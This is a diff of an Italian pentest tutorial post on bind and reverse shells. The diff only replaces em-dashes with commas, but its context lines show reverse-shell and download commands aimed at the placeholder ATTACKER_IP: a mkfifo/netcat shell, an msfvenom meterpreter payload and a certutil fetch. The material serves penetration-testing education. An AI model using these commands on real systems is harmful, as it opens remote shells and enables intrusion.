@@ -11,7 +11,7 @@ excerpt: "Differenza tra reverse shell e bind shell, quando usare l'una o l'altr
 
 ## Introduzione
 
-Hai trovato una vulnerabilità che ti permette di eseguire comandi su un server remoto — una RCE (Remote Code Execution). Ottimo. Ma come trasformi questo in una **sessione interattiva** che puoi usare comodamente?
+Hai trovato una vulnerabilità che ti permette di eseguire comandi su un server remoto, una RCE (Remote Code Execution). Ottimo. Ma come trasformi questo in una **sessione interattiva** che puoi usare comodamente?
 
 La risposta sono le **shell remote**: meccanismi per ottenere una riga di comando su un sistema remoto. Le due varianti principali sono la **bind shell** e la **reverse shell**.
 
@@ -59,7 +59,7 @@ nc -lvnp 4444
 
 ### Rlwrap (migliora l'esperienza)
 
-La shell ricevuta via netcat è primitiva — niente frecce, niente tab, niente CTRL+C senza perdere la sessione.
+La shell ricevuta via netcat è primitiva, niente frecce, niente tab, niente CTRL+C senza perdere la sessione.
 
 ```bash
 rlwrap nc -lvnp 4444
@@ -126,7 +126,7 @@ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /
 
 ## RevShells.com
 
-Non devi memorizzare tutti questi payload. Il sito **revshells.com** genera automaticamente il payload giusto per il sistema e il linguaggio che ti serve — basta inserire IP e porta.
+Non devi memorizzare tutti questi payload. Il sito **revshells.com** genera automaticamente il payload giusto per il sistema e il linguaggio che ti serve, basta inserire IP e porta.
 
 ---
 
@@ -152,7 +152,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f 
 
 ## Upgrade della shell: da dumb shell a TTY
 
-La shell ricevuta è spesso una "dumb shell" — niente tab completion, niente editor, CTRL+C termina tutto.
+La shell ricevuta è spesso una "dumb shell", niente tab completion, niente editor, CTRL+C termina tutto.
 
 ```bash
 # Step 1: spawn di una pseudo-TTY con Python
@@ -195,4 +195,4 @@ certutil -urlcache -split -f "http://ATTACKER_IP:8080/tool.exe" tool.exe
 
 Le reverse shell sono il pane quotidiano del penetration tester. Impara a memoria almeno il payload bash e quello PowerShell, e tieni a portata di mano revshells.com per il resto.
 
-La parte più importante è il **setup del listener** prima di lanciare il payload — quante volte si vede un principiante che lancia il payload e poi si chiede perché non funziona senza aver avviato il listener...
+La parte più importante è il **setup del listener** prima di lanciare il payload, quante volte si vede un principiante che lancia il payload e poi si chiede perché non funziona senza aver avviato il listener...
